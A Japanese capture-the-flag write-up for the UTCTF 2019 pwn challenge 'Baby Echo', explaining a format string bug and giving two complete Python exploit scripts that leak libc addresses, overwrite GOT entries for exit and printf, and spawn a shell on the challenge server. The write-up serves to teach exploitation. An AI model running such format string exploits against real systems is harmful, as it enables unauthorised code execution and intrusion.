# [pwn 700pts] Baby Echo - UTCTF
32ビットバイナリです．
```
$ checksec pwnable 
[*] '/home/ptr/writeups/2019/UTCTF_2019/Baby_Echo/pwnable'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```
IDAで解析しましょう．

まずstdinとstdoutをsetbufした後，fgetsで0x32バイト入力します．
入力されたデータはそのままprintfで出力されるのでFSBが存在します．
最後にexitでプログラムが終了します．

シェルを起動するためには`system("/bin/sh")`などを呼ぶ必要があるのですが，そのためにはsystem関数や`/bin/sh`のアドレスが必要なのでlibc baseをリークする必要があります．
リークに1回，書き換えに1回のprintfが必要なため，2回以上printfを呼ばなくてはなりません．
したがって，1回目にexit関数のGOTをmain関数のアドレスに書き換えてやれば，main終了時に何度もmainが呼び出され，printfをいくらでも使うことができます．

方針としては1回目でアドレスリークおよびexitのGOT書き換えをします．
2回目でprintfのGOTをsystemのアドレスにし，3回目で`/bin/sh`をprintfに渡すことでシェルが起動します．

libcが配られていないので，まずはこれを特定します．
GOTのアドレスを見てやれば関数のアドレスが分かるのでlibc databaseで検索します．
```python
from ptrlib import *

elf = ELF("./pwnable")
sock = Socket("127.0.0.1", 9002)
payload = b"AA"
payload += p32(elf.got('fgets'))
payload += p32(elf.got('setbuf'))
payload += p32(elf.got('puts'))
payload += b".%11$s"
payload += b".%12$s"
payload += b".%13$s."
sock.recvuntil("back.\n")
sock.sendline(payload)
ret = sock.recv()
rets = ret.split(b".")
addr1 = u32(rets[-3][:4])
addr2 = u32(rets[-2][:4])
addr3 = u32(rets[-4][:4])
print("[+] <setbuf> = " + hex(addr1))
print("[+] <puts> = " + hex(addr2))
print("[+] <fgets> = " + hex(addr3))
```

あとは先程説明した通りの攻撃を実行すればOKです．
```python
from pwn import *

elf = ELF("./pwnable")

libc = ELF("./libc6-i386_2.23-0ubuntu10_amd64.so")
sock = remote("stack.overflow.fail", 9002)
#libc = ELF("/lib/libc.so.6")
#sock = remote("localhost", 9002)

# change exit@got --> main
writes = {
    elf.got['exit']: elf.symbols['main']
}
payload = "AA" + fmtstr_payload(11, writes, numbwritten=2, write_size='short')
sock.recvuntil("back.\n")
sock.sendline(payload)

# leak libc base
payload = "AA"
payload += p32(elf.got['fgets'])
payload += ".%11$s."
sock.recvuntil("back.\n")
sock.sendline(payload)
rets = sock.recvline().split(".")
addr_fgets = u32(rets[-2][:4])
libc_base = addr_fgets - libc.symbols['fgets']
print("[+] libc base = " + hex(libc_base))
addr_system = libc_base + libc.symbols['system']

# change printf@got --> system
writes = {
    elf.got['printf']: addr_system
}
payload = "AA" + fmtstr_payload(11, writes, numbwritten=2, write_size='short')
sock.recvuntil("back.\n")
sock.sendline(payload)

# get the shell!
sock.recvuntil("back.\n")
sock.sendline("/bin/sh")

sock.interactive()
```

# 感想
FSBは脆弱性1つでいろいろできるから楽しい．
